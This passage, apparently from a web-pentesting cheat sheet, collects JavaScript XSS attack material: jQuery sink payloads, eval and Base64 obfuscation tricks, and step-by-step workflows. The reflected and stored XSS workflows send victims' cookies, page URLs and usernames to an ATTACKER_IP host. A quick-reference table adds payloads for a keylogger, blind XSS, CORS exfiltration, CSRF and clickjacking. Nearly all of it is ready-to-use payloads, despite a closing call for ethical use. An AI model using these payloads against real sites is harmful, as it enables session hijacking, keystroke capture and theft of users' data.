{{this.constructor.constructor('alert(1)')()}}
```

### jQuery

```javascript [jQuery — Check Version (Vulnerable?)]
if(window.jQuery){
  console.log('jQuery Version:', jQuery.fn.jquery);
  // Versions < 3.5.0 are vulnerable to various XSS attacks
  // via .html(), .append(), .after(), etc.
}
```

```html [jQuery XSS — html() sink]
<!-- If app does: $(selector).html(userInput) -->
<img src=x onerror=alert(1)>
```

```html [jQuery XSS — Selector Injection]
<!-- If app does: $(location.hash) or $(userInput) -->
<!-- jQuery < 3.0 treats HTML in selectors -->
<img src=x onerror=alert(1)>
```

---

## JavaScript Obfuscation Techniques for Payloads

```javascript [Obfuscation — eval with String.fromCharCode]
eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))
// Decodes to: alert(document.cookie)
```

```javascript [Obfuscation — atob (Base64)]
eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))
// Decodes to: alert(document.cookie)
```

```javascript [Obfuscation — Constructor Chain]
[].constructor.constructor('alert(document.cookie)')()
```

```javascript [Obfuscation — Indirect eval]
window['eval']('alert(1)')
this['eval']('alert(1)')
[]['constructor']['constructor']('alert(1)')()
```

```javascript [Obfuscation — Tagged Template Literal]
alert`1`
eval`alert\x281\x29`
```

```javascript [Obfuscation — Object Destructuring]
({a:alert}={a:alert},a(1))
```

```javascript [Obfuscation — Comma Operator]
1,alert(1)
```

```javascript [Obfuscation — Logical OR]
0||alert(1)
```

```javascript [Obfuscation — Optional Chaining]
window?.alert?.(1)
```

```javascript [Obfuscation — Top]
top['alert'](1)
top[/al/.source+/ert/.source](1)
```

```javascript [Obfuscation — with Statement]
with(document)with(body)alert(cookie)
```

```javascript [Obfuscation — Proxy]
new Proxy({},{get:(_,p)=>alert(p)}).anything
```

---

## Full Exploitation Workflows

### Workflow 1 — Reflected XSS to Account Takeover

::steps{level="4"}

#### Discover Reflection Point

```bash [Terminal]
# Find parameters that reflect in response
echo "http://target.com/search?q=REFLECTION_TEST_12345" | httpx -mr "REFLECTION_TEST_12345"
```

#### Determine Context

```javascript [Browser Console — Check injection context]
// View source around the reflected value
// Is it inside:
// 1. HTML body: <div>REFLECTED</div> → inject tags
// 2. HTML attribute: <input value="REFLECTED"> → break out with ">
// 3. JavaScript string: var x = "REFLECTED"; → break out with ";
// 4. JavaScript template: `Hello ${REFLECTED}` → inject ${alert(1)}
// 5. URL context: <a href="REFLECTED"> → inject javascript:
```

#### Craft Context-Specific Payload

```html [HTML Body Context]
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

```html [HTML Attribute Context]
" onfocus=alert(1) autofocus="
" onmouseover=alert(1) "
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
```

```html [JavaScript String Context]
";alert(1)//
'-alert(1)-'
\'-alert(1)//
</script><script>alert(1)</script>
```

```html [URL / href Context]
javascript:alert(1)
javascript:alert(document.domain)
```

#### Escalate to Cookie Theft

```html [Cookie Exfiltration Payload]
"><script>fetch('http://ATTACKER_IP/steal?c='+document.cookie)</script>
```

#### Deliver to Victim

```text [Crafted URL]
http://target.com/search?q="><script>fetch('http://ATTACKER_IP/steal?c='+document.cookie)</script>

# URL encoded:
http://target.com/search?q=%22%3E%3Cscript%3Efetch('http%3A%2F%2FATTACKER_IP%2Fsteal%3Fc%3D'%2Bdocument.cookie)%3C%2Fscript%3E
```

::

### Workflow 2 — Stored XSS in Comment Field

::steps{level="4"}

#### Test for Stored XSS

```html [Step 1 — Probe with Unique String]
<!-- Post as a comment -->
xss_test_abc123<>"'();
```

```html [Step 2 — Check How Input is Rendered]
<!-- View page source, search for your string -->
<!-- If < and > are not encoded: XSS is likely -->
```

```html [Step 3 — Inject Payload]
<script>
fetch('http://ATTACKER_IP/stored-xss', {
  method:'POST',
  body:JSON.stringify({
    cookie:document.cookie,
    url:location.href,
    victim:document.querySelector('.username')?.textContent
  })
});
</script>
```

#### Wait for Victims

Every user who views the page with the comment triggers the payload and sends their cookies to the attacker.

::

### Workflow 3 — DOM XSS via URL Fragment

::steps{level="4"}

#### Identify DOM Sink

```javascript [Browser Console — Search for Sinks]
// Search all inline scripts for dangerous sinks
let dangerousSinks = ['innerHTML','outerHTML','document.write','eval(','setTimeout(','setInterval(','Function(','$.html(','$.append('];
document.querySelectorAll('script:not([src])').forEach(s => {
  let text = s.textContent;
  dangerousSinks.forEach(sink => {
    if(text.includes(sink)){
      console.warn(`Found sink: ${sink}`);
      // Find if it uses location.hash, location.search, etc.
      if(text.includes('location.hash') || text.includes('location.search') || text.includes('document.URL')){
        console.error(`VULNERABLE: ${sink} with user-controlled source!`);
      }
    }
  });
});
```

#### Exploit

```text [DOM XSS via hash]
http://target.com/page#<img src=x onerror=alert(document.cookie)>
```

```text [DOM XSS via search parameter]
http://target.com/page?input=<img src=x onerror=alert(1)>
```

::

---

## Quick Reference

::collapsible

| Attack Type | Payload |
| ----------- | ------- |
| **Basic XSS** | `<script>alert(1)</script>` |
| **IMG XSS** | `<img src=x onerror=alert(1)>` |
| **SVG XSS** | `<svg onload=alert(1)>` |
| **Event XSS** | `<body onload=alert(1)>` |
| **JavaScript Protocol** | `<a href="javascript:alert(1)">` |
| **Cookie Steal** | `<script>fetch('http://ATK/s?c='+document.cookie)</script>` |
| **Keylogger** | `<script>document.onkeypress=e=>fetch('http://ATK/k?'+e.key)</script>` |
| **DOM XSS** | `http://target.com/#<img src=x onerror=alert(1)>` |
| **Blind XSS** | `"><script src=http://ATK/blind.js></script>` |
| **CORS Exploit** | `fetch(target,{credentials:'include'}).then(r=>r.text()).then(d=>fetch('http://ATK/s',{method:'POST',body:d}))` |
| **CSRF** | `<form action="target/api" method=POST><input name=x value=y></form><script>document.forms[0].submit()</script>` |
| **Prototype Pollution** | `{"__proto__":{"isAdmin":true}}` |
| **CSP Bypass (eval)** | `<script>eval('alert(1)')</script>` |
| **CSP Bypass (JSONP)** | `<script src="allowed-domain.com/jsonp?callback=alert(1)//"></script>` |
| **PostMessage** | `target.postMessage('<img src=x onerror=alert(1)>','*')` |
| **Clickjacking** | `<iframe src="target.com" style="opacity:0.0001">` |
| **DOM Clobbering** | `<form id="config"><input id="url" value="evil.com">` |
| **Read Cookies (Console)** | `document.cookie` |
| **Read Storage (Console)** | `JSON.stringify(localStorage)` |
| **Decode JWT (Console)** | `JSON.parse(atob(token.split('.')[1]))` |
| **Find Hidden Fields** | `document.querySelectorAll('input[type=hidden]')` |
| **Reveal Passwords** | `document.querySelectorAll('input[type=password]').forEach(p=>p.type='text')` |

::

::tip
JavaScript is the most powerful weapon in a web application pentester's arsenal. Every modern web application is built on it. Every browser executes it. Every user trusts it. And when you control the JavaScript that runs in a victim's browser — you control their entire session, their data, and their actions.

Master these techniques. Use them ethically. Break things so they can be fixed. :icon{name="i-lucide-braces"}
::